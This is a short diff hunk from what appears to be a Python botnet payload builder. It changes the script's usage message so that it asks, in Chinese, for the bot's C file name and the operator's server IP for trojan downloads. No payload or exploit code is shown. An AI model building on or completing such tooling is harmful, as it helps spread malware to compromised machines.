@@ -5,7 +5,7 @@ import base64
 
 if len(sys.argv) < 3 or not sys.argv[2]:  # 修改参数检查逻辑
     print("\x1b[0;31mIncorrect Usage!")
-    print(f"\x1b[0;32mUsage: python {sys.argv[0]} <BOTNAME.C> <IPADDR> \x1b[0m")
+    print(f"\x1b[0;32mUsage: python {sys.argv[0]} <你的僵尸的名称.c> <你服务器的IP|做马子下载> \x1b[0m")
     exit(1)
 
 ip = sys.argv[2]
